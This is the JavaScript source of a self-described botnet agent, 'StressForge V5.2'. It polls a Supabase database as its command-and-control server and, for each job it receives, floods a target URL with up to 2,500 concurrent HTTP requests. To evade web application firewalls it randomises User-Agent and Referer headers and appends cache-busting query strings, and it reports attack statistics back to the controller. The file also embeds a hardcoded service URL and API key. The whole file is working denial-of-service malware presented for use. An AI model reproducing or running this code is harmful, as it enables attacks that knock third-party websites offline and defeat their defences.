/**
 * STRESSFORGE BOTNET AGENT V5.2 (POLYMORPHIC CHAOS)
 * - Feature: Per-Request Header Randomization (User-Agent/Referer)
 * - Feature: Bypass WAF Fingerprinting
 * - Optimization: Free Tier Memory Safety
 */
const https = require('https');
const http = require('http');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
const MAX_SAFE_CONCURRENCY = 2500; 

// --- ASSETS FOR POLYMORPHISM ---
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
];
const REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://t.co/",
    "https://www.youtube.com/",
    "https://www.bing.com/"
];

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V5.2 Active'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: ROBUST REQUEST ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); }
                });
            });
            req.on('error', (e) => { 
                console.error('[NET-ERR] Supabase Connection Failed:', e.message); 
                reject(e); 
            });
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[36m[AGENT] Initialized V5.2 (POLYMORPHIC). Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

const startAttack = (job) => {
    if (activeJob) return;
    
    if (job.concurrency > MAX_SAFE_CONCURRENCY) {
        console.log(`\x1b[31m[SAFETY] Capping threads from ${job.concurrency} to ${MAX_SAFE_CONCURRENCY}\x1b[0m`);
        job.concurrency = MAX_SAFE_CONCURRENCY;
    }

    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[33m[ATTACK] ${job.method || 'GET'} ${job.target} | Threads: ${job.concurrency} | Duration: ${duration}s\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    
    const startTime = Date.now();
    let targetUrl;
    try { targetUrl = new URL(job.target); } catch(e) { console.error('Invalid Target URL'); return; }
    
    const agent = new https.Agent({ 
        keepAlive: true, 
        keepAliveMsecs: 1000, 
        maxSockets: Infinity,
        scheduling: 'fifo'
    });
    
    let baseHeaders = job.headers || {};
    if (typeof baseHeaders === 'string') {
        try { baseHeaders = JSON.parse(baseHeaders); } catch(e) { baseHeaders = {}; }
    }

    const performRequest = () => {
        if (!running) return;

        // CHAOS VORTEX: PER-REQUEST RANDOMIZATION
        const currentHeaders = { ...baseHeaders };
        currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        currentHeaders['Referer'] = REFERERS[Math.floor(Math.random() * REFERERS.length)];
        currentHeaders['Cache-Control'] = 'no-cache, no-store';
        currentHeaders['Host'] = targetUrl.host;

        const vortexUrl = new URL(targetUrl.href);
        const separator = vortexUrl.search ? '&' : '?';
        vortexUrl.search += `${separator}_vortex=${Math.random().toString(36).substring(2)}`;

        const start = Date.now();
        const lib = vortexUrl.protocol === 'https:' ? https : http;

        const req = lib.request(vortexUrl, {
            agent,
            method: job.method || 'GET',
            headers: currentHeaders,
            timeout: 5000
        }, (res) => {
            const lat = Date.now() - start;
            jobLatencySum += lat;
            jobReqsForLatency++;
            
            // Redirect Following
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                res.resume();
                // Simple redirect follow logic would go here, 
                // but for mass-stress we count 3xx as success or fail based on target
                if (res.statusCode >= 200 && res.statusCode < 400) jobSuccess++; else jobFailed++;
            } else {
                if (res.statusCode >= 200 && res.statusCode < 300) jobSuccess++;
                else jobFailed++;
            }
            res.resume();
            totalRequests++;
            if (running) setImmediate(performRequest);
        });

        req.on('socket', (socket) => socket.setNoDelay(true));
        req.on('error', () => { jobFailed++; totalRequests++; if(running) setImmediate(performRequest); });
        
        if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
             try { req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body)); } catch(e) {}
        }
        req.end();
    };

    for(let i=0; i<job.concurrency; i++) performRequest();

    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        const used = process.memoryUsage().heapUsed / 1024 / 1024;
        if (used > 450 && global.gc) global.gc();

        try {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
                 current_rps: rps,
                 total_success: jobSuccess,
                 total_failed: jobFailed,
                 avg_latency: avgLat
             });
        } catch(e) { }

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED', logs: 'Finished by Agent Timeout' });
            console.log('[COMPLETE] Attack finished successfully.');
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
